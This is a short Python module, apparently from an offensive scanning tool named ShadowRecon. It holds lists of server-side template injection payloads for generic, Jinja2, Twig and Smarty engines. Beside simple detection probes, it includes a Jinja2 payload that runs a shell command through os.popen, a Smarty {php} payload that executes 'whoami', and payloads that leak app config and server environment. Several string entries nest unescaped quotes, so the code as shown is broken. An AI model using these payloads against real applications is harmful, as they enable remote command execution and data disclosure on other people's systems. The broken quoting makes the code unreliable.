"""
Template Injection Payloads for ShadowRecon v1.0
"""

class TemplatePayloads:
    """Template injection payloads"""

    BASIC_MATH = [
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '<%= 7*7 %>',
        '{{7*'7'}}',
        '${7*'7'}',
    ]

    JINJA2_PAYLOADS = [
        '{{config}}',
        '{{request}}',
        '{{g}}',
        '{{config.items()}}',
        '{{request.environ}}',
        '{{cycler.__init__.__globals__.os.popen('whoami').read()}}',
    ]

    TWIG_PAYLOADS = [
        '{{7*7}}',
        '{{_self}}',
        '{{dump(app)}}',
        '{{app.request.server.all|join(',')}}',
    ]

    SMARTY_PAYLOADS = [
        '{$smarty.version}',
        '{php}echo `whoami`;{/php}',
        '{literal}{/literal}',
    ]

    @classmethod
    def get_all_payloads(cls):
        return cls.BASIC_MATH + cls.JINJA2_PAYLOADS + cls.TWIG_PAYLOADS + cls.SMARTY_PAYLOADS
